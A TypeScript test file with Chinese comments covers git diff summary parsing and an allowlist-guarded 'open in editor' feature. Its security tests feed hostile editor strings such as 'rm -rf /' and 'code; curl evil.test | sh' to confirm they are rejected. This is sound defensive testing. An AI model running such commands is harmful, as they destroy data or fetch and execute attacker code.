/**
 * diff 摘要 与 在编辑器打开。
 *
 * 前者钉两件**不报错但结果是错的**事：
 * 1. 二进制文件在 numstat 里那两列是 `-`，Number() 直接吃会得到 NaN → 界面显示 "NaN 行"
 * 2. **未跟踪文件在 `git diff` 里根本看不见** —— 而 agent 干的活里"新建了什么"
 *    往往比"改了什么"更关键，漏掉它等于摘要在说谎
 *
 * 后者钉的是安全：编辑器命令会进 argv，不做白名单它就是任意命令执行入口。
 */
import { test } from 'node:test'
import assert from 'node:assert/strict'
import { parseNumstat, parseUntracked, diffSummary } from '../src/main/worktree.ts'
import { resolveEditor, openInEditor } from '../src/main/open-in-editor.ts'

test('numstat 常规三列', () => {
  const r = parseNumstat('3\t1\tsrc/a.ts\n10\t0\tREADME.md\n')
  assert.deepEqual(r, [
    { path: 'src/a.ts', added: 3, removed: 1 },
    { path: 'README.md', added: 10, removed: 0 }
  ])
})

test('**二进制文件的 `-` 不能变成 NaN**', () => {
  const r = parseNumstat('-\t-\tassets/icon.png\n')
  assert.deepEqual(r, [{ path: 'assets/icon.png', added: 0, removed: 0 }])
})

test('重命名取箭头右边那截（摘要要的是"改了哪些文件"）', () => {
  const r = parseNumstat('1\t1\tsrc/{old => new}/a.ts\n2\t0\tx.ts => y.ts\n')
  assert.deepEqual(r.map((f) => f.path), ['src/new/a.ts', 'y.ts'])
})

test('空输入与噪音行不炸', () => {
  assert.deepEqual(parseNumstat(''), [])
  assert.deepEqual(parseNumstat('随便一行\n\n'), [])
})

test('未跟踪文件从 status 里取（diff 看不见它们）', () => {
  assert.deepEqual(parseUntracked(' M a.ts\n?? new.ts\n?? 带 空格.md\n'), ['new.ts', '带 空格.md'])
})

test('端到端：改了的、新建的、二进制的都出现在摘要里', async () => {
  const { mkdtemp, writeFile, rm } = await import('node:fs/promises')
  const { execFileSync } = await import('node:child_process')
  const { tmpdir } = await import('node:os')
  const path = await import('node:path')

  const dir = await mkdtemp(path.join(tmpdir(), 'diff-'))
  try {
    const env = {
      ...process.env,
      GIT_AUTHOR_NAME: 't',
      GIT_AUTHOR_EMAIL: 'a@b',
      GIT_COMMITTER_NAME: 't',
      GIT_COMMITTER_EMAIL: 'a@b'
    }
    execFileSync('/usr/bin/git', ['init', '-q', dir])
    await writeFile(path.join(dir, 'a.txt'), 'one\n')
    execFileSync('/usr/bin/git', ['add', '.'], { cwd: dir, env })
    execFileSync('/usr/bin/git', ['commit', '-q', '-m', 'i'], { cwd: dir, env })

    await writeFile(path.join(dir, 'a.txt'), 'one\ntwo\n') // 改一行
    await writeFile(path.join(dir, 'brand-new.txt'), 'x\n') // 未跟踪

    const sum = await diffSummary(dir)
    assert.ok(sum)
    const paths = sum.files.map((f) => f.path).toSorted()
    assert.deepEqual(paths, ['a.txt', 'brand-new.txt'], '新建的文件必须出现')
    assert.equal(sum.files.find((f) => f.path === 'brand-new.txt')?.untracked, true)
    assert.equal(sum.added, 1, '改动行数只算已跟踪的那些')
  } finally {
    await rm(dir, { recursive: true, force: true })
  }
})

test('非 git 目录 / 不存在的路径返回 null（UI 据此隐藏功能）', async () => {
  assert.equal(await diffSummary('/绝不存在的路径'), null)
})

// ── 在编辑器打开：这是一条把用户可控字符串交给子进程的路 ──

test('**编辑器只认白名单**，任意字符串一律拒绝', () => {
  assert.equal(resolveEditor('rm -rf /'), null)
  assert.equal(resolveEditor('code; curl evil.test | sh'), null)
  assert.equal(resolveEditor(''), null)
  assert.equal(resolveEditor('绝不存在的编辑器'), null)
})

test('白名单里的名字大小写不敏感、两边空白不影响', () => {
  // 装没装另说，关键是判据认得出它；没装返回 null 也是对的
  const a = resolveEditor('  CODE ')
  const b = resolveEditor('code')
  assert.equal(a, b)
})

test('相对路径 / 带 NUL 的路径直接拒（不给子进程按自己的 cwd 解析的机会）', async () => {
  assert.equal((await openInEditor('relative/path', 'code')).ok, false)
  assert.equal((await openInEditor('/tmp/a\0b', 'code')).ok, false)
  assert.match((await openInEditor('relative/path', 'code')).error ?? '', /绝对路径/)
})

test('路径不存在时明说，而不是静默成功', async () => {
  const r = await openInEditor('/绝不存在/x', 'code')
  assert.equal(r.ok, false)
  assert.match(r.error ?? '', /不存在/)
})
